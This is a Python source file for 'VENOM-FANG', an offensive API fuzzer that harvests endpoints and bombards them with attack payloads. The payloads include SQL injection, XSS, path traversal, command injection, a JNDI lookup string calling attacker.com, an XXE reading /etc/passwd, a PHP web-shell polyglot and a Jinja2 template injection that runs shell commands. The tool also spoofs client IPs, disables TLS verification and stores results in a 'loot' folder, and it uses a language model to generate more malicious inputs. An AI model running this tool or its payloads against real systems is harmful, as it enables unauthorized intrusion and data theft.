#!/usr/bin/env python3
"""
VENOM-FANG
The API Fuzzer & 0-Day Hunter.
It doesn't just fuzz—it understands API semantics, uses AI to generate plausible-but-malicious payloads,
and employs temporal & polyglot attacks to find holes mere scanners miss.
"""

import asyncio
import aiohttp
import json
import re
from dataclasses import dataclass
from typing import Dict, List, Optional, Any
from rich.console import Console
from rich.table import Table
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import hashlib
from datetime import datetime, timedelta
import random

# Our surprise imports
from utils.payload_genius import PayloadGenius
from utils.semantic_analyzer import infer_parameter_semantics

console = Console()

@dataclass
class APIEndpoint:
    url: str
    method: str
    parameters: Dict[str, Any]  # name -> {'in': 'query|body|path', 'type': inferred}
    discovered_from: str  # Which host context found it
    tested: bool = False
    vulnerable: bool = False

class VenomFang:
    def __init__(self, root_domain: str, knowledge_graph):
        self.root_domain = root_domain
        self.kg = knowledge_graph
        self.endpoints: List[APIEndpoint] = []
        self.polyglot_gen = PolyglotGenerator()
        self.temporal_engine = TemporalPayloadFactory()
        self.session = None
        
        # AI Payload Seeds - Load a local, lightweight LLM for creativity
        try:
            from transformers import pipeline
            self.payload_generator = pipeline('text-generation', 
                                              model='distilgpt2',
                                              device=-1)  # CPU for now
            self.ai_enabled = True
            console.print("[dim]✓ AI payload generator loaded.[/dim]")
        except:
            self.ai_enabled = False
            console.print("[yellow]⚠ AI generator offline. Using rule-based fallback.[/yellow]")

    async def _harvest_endpoints_from_graph(self):
        """Pull discovered API endpoints from the knowledge graph."""
        # This would query the KG. For now, simulate from queue file.
        try:
            with open("data/api_endpoints_queue.txt", "r") as f:
                urls = [line.strip() for line in f if line.strip()]
        except:
            urls = []
        
        for url in urls:
            parsed = urlparse(url)
            # Basic heuristic to identify parameters
            param_dict = {}
            # Query params
            for param, values in parse_qs(parsed.query).items():
                param_dict[param] = {'in': 'query', 'type': self._infer_type(values[0])}
            # Path params (e.g., /api/user/{id}/)
            path_parts = parsed.path.split('/')
            for part in path_parts:
                if part.startswith('{') and part.endswith('}'):
                    param_name = part[1:-1]
                    param_dict[param_name] = {'in': 'path', 'type': 'string'}
            
            # Determine method (heuristic - could be improved with Burp data)
            method = "GET"  # Default
            if any(p in parsed.path.lower() for p in ['/update', '/create', '/delete', '/add']):
                method = "POST"
            
            endpoint = APIEndpoint(url=url, method=method, 
                                 parameters=param_dict, 
                                 discovered_from=parsed.hostname)
            self.endpoints.append(endpoint)
        
        console.print(f"[green]✓ Harvested [magenta]{len(self.endpoints)}[/magenta] API endpoints for analysis.[/green]")

    def _infer_type(self, sample_value: str) -> str:
        """Crude but effective type inference."""
        if sample_value.isdigit():
            return 'integer'
        elif sample_value.replace('.', '', 1).isdigit():
            return 'float'
        elif sample_value.lower() in ['true', 'false']:
            return 'boolean'
        elif re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', sample_value):
            return 'uuid'
        elif re.match(r'^\d{4}-\d{2}-\d{2}', sample_value):
            return 'date'
        else:
            return 'string'

    def _generate_ai_payloads(self, param_name: str, param_type: str) -> List[str]:
        """Use AI to generate creative, semantically relevant malicious inputs."""
        if not self.ai_enabled:
            return []
        
        prompts = {
            'string': f"Generate 10 malicious, sneaky values for a web API parameter named '{param_name}'. Focus on SQL injection, XSS, path traversal, and command injection. Make them look plausible:",
            'integer': f"Generate 10 malicious integer values for API parameter '{param_name}' that could cause overflows, IDOR, or logic flaws:",
            'uuid': f"Generate 10 malicious UUID values for parameter '{param_name}' that could bypass checks or cause collisions:",
            'date': f"Generate 10 malicious date/time values for parameter '{param_name}' to cause time-based logic errors or injections:"
        }
        
        prompt = prompts.get(param_type, prompts['string'])
        try:
            results = self.payload_generator(prompt, max_length=150, num_return_sequences=1, 
                                           temperature=0.9, do_sample=True)
            raw_text = results[0]['generated_text']
            # Extract bullet points or quoted values
            lines = [line.strip('- "') for line in raw_text.replace(prompt, '').split('\n') if line.strip()]
            return lines[:10]
        except:
            return []

    def _generate_polyglot_payload(self, base_type: str) -> str:
        """Generate a polyglot payload suitable for the parameter type."""
        if base_type == 'string':
            return self.polyglot_gen.create_multipurpose_string()
        elif base_type == 'integer':
            # A string that's also a number in some contexts
            return "0xdeadbeef"  # Hex literal
        elif base_type == 'date':
            # A date that's also SQL
            return "2024-01-01' OR '1'='1'--"
        else:
            return self.polyglot_gen.create_multipurpose_string()

    async def _test_endpoint_concurrently(self, endpoint: APIEndpoint):
        """The core fuzzing logic with our surprise techniques."""
        console.print(f"[dim]  Fuzzing [blue]{endpoint.method}[/blue] [cyan]{endpoint.url}[/cyan][/dim]")
        
        # Prepare base request
        parsed = urlparse(endpoint.url)
        base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', '', ''))
        
        # Test each parameter with increasingly creative payloads
        for param_name, param_info in endpoint.parameters.items():
            param_type = param_info['type']
            location = param_info['in']
            
            # PAYLOAD SETS (escalating creativity)
            payload_sets = []
            
            # Set 1: Basic malicious payloads
            basics = ["' OR '1'='1", "<script>alert(1)</script>", "../../../etc/passwd", 
                     "{{7*7}}", "|| ping -c 10 127.0.0.1 ;", "${jndi:ldap://attacker.com/a}"]
            payload_sets.append(basics)
            
            # Set 2: AI-generated, semantically relevant payloads
            ai_payloads = self._generate_ai_payloads(param_name, param_type)
            if ai_payloads:
                payload_sets.append(ai_payloads)
            
            # Set 3: Polyglot payloads
            polyglots = [self._generate_polyglot_payload(param_type) for _ in range(3)]
            payload_sets.append(polyglots)
            
            # Set 4: Temporal payloads (if date-related)
            if param_type == 'date':
                temporal = self.temporal_engine.generate_time_anomalies()
                payload_sets.append(temporal)
            
            # Flatten and deduplicate
            all_payloads = []
            for ps in payload_sets:
                all_payloads.extend(ps)
            all_payloads = list(set(all_payloads))[:50]  # Limit for demo
            
            # FUZZING LOOP
            for payload in all_payloads:
                # Construct request based on parameter location
                if location == 'query':
                    query_dict = parse_qs(parsed.query)
                    query_dict[param_name] = [payload]
                    new_query = urlencode(query_dict, doseq=True)
                    target_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
                                           '', new_query, ''))
                    request_body = None
                else:  # For simplicity, assume body for non-query params in POST
                    target_url = endpoint.url
                    request_body = {param_name: payload}
                
                # Make the request with varying headers (including temporal manipulation)
                headers = {
                    'User-Agent': 'Arachne/Venom-Fang',
                    'X-Forwarded-For': f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                }
                
                # TEMPORAL ATTACK: Send with historical Date header
                historical_date = (datetime.now() - timedelta(days=random.randint(1, 365))).strftime('%a, %d %b %Y %H:%M:%S GMT')
                headers['Date'] = historical_date
                
                try:
                    async with aiohttp.ClientSession() as session:
                        if endpoint.method == 'GET':
                            async with session.get(target_url, headers=headers, ssl=False, timeout=10) as resp:
                                await self._analyze_response(resp, endpoint, param_name, payload)
                        elif endpoint.method == 'POST':
                            async with session.post(target_url, json=request_body, headers=headers, ssl=False, timeout=10) as resp:
                                await self._analyze_response(resp, endpoint, param_name, payload)
                        
                        # Small delay to be slightly more human
                        await asyncio.sleep(0.1)
                        
                except Exception as e:
                    console.print(f"[red]    Request failed: {e}[/red]")
        
        endpoint.tested = True

    async def _analyze_response(self, response, endpoint: APIEndpoint, param: str, payload: str):
        """Advanced response analysis looking for subtle signs of success."""
        indicators = []
        
        # 1. Timing-based detection
        # (In real implementation, we'd measure against baseline)
        
        # 2. Error message analysis
        error_indicators = ['sql', 'syntax', 'mysql', 'postgresql', 'oracle', 
                           'unclosed', 'quotation', 'undefined', 'exception',
                           'eval', 'runtime', 'typeerror']
        response_text = await response.text()
        
        for indicator in error_indicators:
            if indicator in response_text.lower():
                indicators.append(f"Error contains '{indicator}'")
        
        # 3. Differential analysis (compare with benign request)
        # This would require storing baseline responses
        
        # 4. Content length anomalies
        content_length = len(response_text)
        # We'd track normal lengths per endpoint
        
        # 5. Polyglot success detection
        # Check if our polyglot executed in any context
        if 'd4rks1d3' in response_text:  # Marker in our polyglot
            indicators.append("Polyglot marker detected in response")
        
        if indicators:
            endpoint.vulnerable = True
            console.print(f"[bold red]🔥 POTENTIAL HIT![/bold red]")
            console.print(f"   Endpoint: [cyan]{endpoint.url}[/cyan]")
            console.print(f"   Parameter: [yellow]{param}[/yellow]")
            console.print(f"   Payload: [magenta]{payload[:50]}...[/magenta]")
            console.print(f"   Indicators: {', '.join(indicators)}")
            console.print(f"   Status: {response.status}")
            
            # Log to critical findings
            finding = {
                'target': self.root_domain,
                'type': 'API Parameter Injection',
                'vector': f"{endpoint.method} {endpoint.url} - {param}",
                'payload': payload,
                'indicators': indicators,
                'timestamp': datetime.now().isoformat()
            }
            
            # Write to loot directory
            loot_dir = "data/loot"
            os.makedirs(loot_dir, exist_ok=True)
            filename = f"{loot_dir}/api_hit_{hashlib.md5(f'{endpoint.url}{param}'.encode()).hexdigest()[:8]}.json"
            with open(filename, 'w') as f:
                json.dump(finding, f, indent=2)
            
            # Trigger notification
            from modules.signal_system import SignalSystem
            sig = SignalSystem()
            await sig.send_critical(finding)

    async def monitor_and_fuzz(self):
        """Main method: watches for new endpoints and fuzzes them."""
        console.print(f"[bold cyan]\n🐍 VENOM-FANG awakening for [blue]{self.root_domain}[/blue][/bold cyan]")
        
        # Initial harvest
        await self._harvest_endpoints_from_graph()
        
        # Continuous monitoring loop (in real impl, would watch graph updates)
        while True:
            if self.endpoints:
                # Fuzz all endpoints concurrently
                tasks = [self._test_endpoint_concurrently(ep) for ep in self.endpoints if not ep.tested]
                if tasks:
                    console.print(f"[yellow]••• Launching [magenta]{len(tasks)}[/magenta] fuzzing tasks concurrently...[/yellow]")
                    await asyncio.gather(*tasks, return_exceptions=True)
            
            # Wait before checking for new endpoints again
            await asyncio.sleep(30)  # Polling interval
            # Check for new endpoints
            await self._harvest_endpoints_from_graph()

# Supporting utility class for polyglots
class PolyglotGenerator:
    def create_multipurpose_string(self) -> str:
        """Creates a string that's dangerous in multiple contexts."""
        # This is a simple example. Real implementation would be more sophisticated.
        polyglots = [
            # PNG + PHP polyglot (simplified)
            "‰PNG\r\n\x1a\n<?php system($_GET['c']); ?>",
            # SQL + JS + Path traversal
            "'); DROP TABLE users;-- <img src=x onerror=alert(1)> ../../../etc/passwd",
            # XML + XXE + HTML
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo><script>alert(1)</script>",
            # Jinja2 + SSTI + Command injection
            "{{config}} {{self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read()}} `whoami`"
        ]
        return random.choice(polyglots)

class TemporalPayloadFactory:
    def generate_time_anomalies(self) -> List[str]:
        """Generate time-based payloads for temporal attacks."""
        anomalies = [
            "1970-01-01",  # Unix epoch - often causes issues
            "2038-01-19",  # Year 2038 problem
            "0000-00-00",  # Zero date
            "9999-12-31",  # Far future
            "2024-02-30",  # Invalid date
            "2024-13-01",  # Invalid month
            "2024-01-01T25:00:00",  # Invalid hour
            "-1 days",  # Relative time
            "now()",  # DB function
            "sleep(5)",  # Time delay
            "CURRENT_TIMESTAMP--",  # SQL
            "new Date(0)",  # JS epoch
        ]
        return anomalies

# Quick test
async def main():
    vf = VenomFang("example.com", None)
    # Simulate an endpoint
    ep = APIEndpoint(url="http://api.example.com/users?id=123", method="GET",
                    parameters={'id': {'in': 'query', 'type': 'integer'}},
                    discovered_from="api.example.com")
    vf.endpoints.append(ep)
    await vf._test_endpoint_concurrently(ep)

if __name__ == "__main__":
    asyncio.run(main())